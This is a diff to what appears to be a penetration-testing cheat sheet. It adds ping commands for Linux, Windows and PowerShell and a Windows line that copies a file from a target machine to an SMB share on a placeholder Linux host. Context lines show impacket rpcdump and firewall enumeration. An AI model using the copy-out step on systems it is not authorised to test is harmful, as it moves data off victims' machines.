@@ -696,6 +696,9 @@ sudo update-ca-certificates
 # check for GUI
 pidof X
 
+# ping host
+ping -c 1 IP_here
+
 # list running processes
 ps
 ps -ef
@@ -964,6 +967,9 @@ netsh firewall show state
 
 # show firewall config
 netsh firewall show config
+
+# ping host
+ping -n 1 IP_here
 
 # list scheduled tasks
 schtasks /query /fo LIST /v
@@ -1811,6 +1817,8 @@ cd \\Lin_IP_here\share_name_here_can_be_different_from_above\
 //Lin_IP_here/share_here/file_here arg_here
 ## copy file from share to box
 copy //Lin_IP_here/share_here/file_here C:\path\to\file\on\box
+## copy file from box to share
+copy C:\path\to\file\on\box //Lin_IP_here/share_here/file_here
 
 # rpcdump
 /path/to/impacket/rpcdump -port 135 IP_here
@@ -3118,6 +3126,10 @@ Rename-Item C:\path\to\file\old\name C:\path\to\file\new\name
 
 # reboot localhost
 Restart-Computer .
+
+# ping host
+Test-Connection -ComputerName computer_name_here -ErrorAction Stop -Count 1
+Test-Connection -ComputerName IP_here -ErrorAction Stop -Count 1
 ```
 
 
